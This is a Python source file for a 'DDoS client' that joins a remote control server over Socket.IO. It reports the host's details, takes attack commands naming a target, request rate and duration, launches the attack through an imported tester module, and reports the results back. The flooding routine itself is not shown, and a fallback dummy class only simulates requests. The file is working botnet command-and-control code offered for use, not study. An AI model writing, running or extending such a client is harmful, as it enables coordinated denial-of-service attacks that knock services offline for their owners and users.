"""
Fixed DDoS Client - Connects to control server
"""
import socketio
import requests
import psutil
import platform
import time
import threading
import sys
import os
from datetime import datetime

# Try to import tool module
try:
    from tool import NetworkLayerTester, print_banner
except ImportError:
    # Create dummy implementations if tool.py doesn't exist
    print("⚠️ Warning: Using dummy NetworkLayerTester")
    
    class NetworkLayerTester:
        def __init__(self, target, target_type="http", requests_per_second=10, 
                     duration=10, use_proxy=False, proxy_config=None):
            self.target = target
            self.target_type = target_type
            self.results = []
            print(f"Dummy tester for: {target}")
        
        def execute_enhanced_attack(self):
            print(f"Simulating attack on {self.target}...")
            for i in range(3):
                time.sleep(1)
                print(f"  Sending request {i+1}")
            print("Dummy attack complete")
            self.results = [{'success': True} for _ in range(30)]
    
    def print_banner():
        print("=== DDoS Client (Dummy Mode) ===")

class DDoSClient:
    def __init__(self, server_url='http://localhost:5000', client_name=None):
        self.server_url = server_url
        self.client_name = client_name or f"Client_{platform.node()}"
        
        # Initialize SocketIO client
        try:
            self.sio = socketio.SimpleClient()
            print("Using SimpleClient")
        except AttributeError:
            try:
                self.sio = socketio.Client()
                print("Using Client")
            except:
                print("❌ Failed to initialize SocketIO client")
                sys.exit(1)
        
        self.current_attack = None
        self.running = False
        
        # Client info
        self.client_info = {
            'name': self.client_name,
            'hostname': platform.node(),
            'platform': platform.platform(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'start_time': datetime.now().isoformat()
        }
        
        # Setup event handlers
        self.setup_handlers()
    
    def setup_handlers(self):
        @self.sio.event
        def connect():
            print(f"✅ Connected to: {self.server_url}")
            self.sio.emit('client_register', self.client_info)
        
        @self.sio.event
        def welcome(data):
            print(f"Server: {data.get('message', 'Welcome')}")
        
        @self.sio.event
        def registration_success(data):
            print(f"✅ Registered: {data.get('client_id', 'Unknown')}")
        
        @self.sio.event
        def start_attack(data):
            print(f"\n🎯 Attack Command:")
            print(f"   ID: {data.get('attack_id')}")
            print(f"   Target: {data.get('config', {}).get('target')}")
            print(f"   Starting attack...")
            
            # Start attack in background thread
            attack_thread = threading.Thread(
                target=self.run_attack,
                args=(data.get('attack_id'), data.get('config', {})),
                daemon=True
            )
            attack_thread.start()
        
        @self.sio.event
        def stop_attack(data):
            print(f"🛑 Stopping attack: {data.get('attack_id')}")
            self.running = False
    
    def run_attack(self, attack_id, config):
        """Run the attack"""
        try:
            target = config.get('target', 'unknown')
            print(f"Attacking: {target}")
            
            # Use NetworkLayerTester
            tester = NetworkLayerTester(
                target=target,
                target_type=config.get('layer', 'http'),
                requests_per_second=config.get('rps', 50),
                duration=config.get('duration', 30)
            )
            
            tester.execute_enhanced_attack()
            
            # Report completion
            self.sio.emit('attack_complete', {
                'attack_id': attack_id,
                'status': 'completed',
                'requests': len(tester.results) if hasattr(tester, 'results') else 0
            })
            
            print(f"✅ Attack {attack_id} completed")
            
        except Exception as e:
            print(f"❌ Attack failed: {e}")
            self.sio.emit('attack_error', {
                'attack_id': attack_id,
                'error': str(e)
            })
    
    def connect(self):
        """Connect to server"""
        try:
            print_banner()
            print(f"\n🔗 Connecting to: {self.server_url}")
            print("⚡ Press Ctrl+C to disconnect\n")
            
            self.sio.connect(self.server_url)
            
            # Keep running
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n🛑 Disconnecting...")
            self.sio.disconnect()
        except Exception as e:
            print(f"❌ Error: {e}")
            sys.exit(1)

def main():
    """Main function"""
    # Get server URL
    server_url = input("🌐 Server URL [http://localhost:5000]: ").strip()
    if not server_url:
        server_url = "http://localhost:5000"
    
    # Get client name
    client_name = input("🏷️  Client name [auto]: ").strip()
    
    # Create and run client
    client = DDoSClient(server_url=server_url, client_name=client_name)
    client.connect()

if __name__ == "__main__":
    main()
EOF

